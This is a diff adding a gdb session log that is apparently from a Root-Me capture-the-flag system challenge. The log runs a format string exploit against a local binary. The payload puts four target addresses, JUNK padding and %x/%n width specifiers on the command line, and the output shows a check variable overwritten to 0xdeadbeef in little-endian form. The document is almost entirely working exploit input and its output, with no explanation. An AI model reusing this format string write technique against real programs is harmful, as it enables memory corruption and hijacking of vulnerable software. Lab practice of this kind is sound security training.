@@ -1,0 +1,12 @@
+(gdb) run "`python -c 'print "AAAA" + "\x0c\xd2\xff\xffJUNK\x0d\xd2\xff\xffJUNK\x0e\xd2\xff\xffJUNK\x0f\xd2\xff\xff" + "%x%x%x%x%165x%n%207x%n%273x%n%305x%n"'`" 
+Starting program: /root/freshnuts/pentest/ctf/root-me/challenges/app-system/ch14/ch14 "`python -c 'print "AAAA" + "\x0c\xd2\xff\xffJUNK\x0d\xd2\xff\xffJUNK\x0e\xd2\xff\xffJUNK\x0f\xd2\xff\xff" + "%x%x%x%x%165x%n%207x%n%273x%n%305x%n"'`"
+check at 0xffffd20c
+argv[1] = [AAAA
+���JUNK���JUNK���%x%x%x%x%165x%n%207x%n%273x%n%305x%n]
+
+You are on the right way !
+fmt=[AAAA
+���JUNK���JUNK���56555628f7fb4a7c1f7f89b48                                                                      ]
+check=0xefbeadde
+[Inferior 1 (process 4979) exited normally]
+
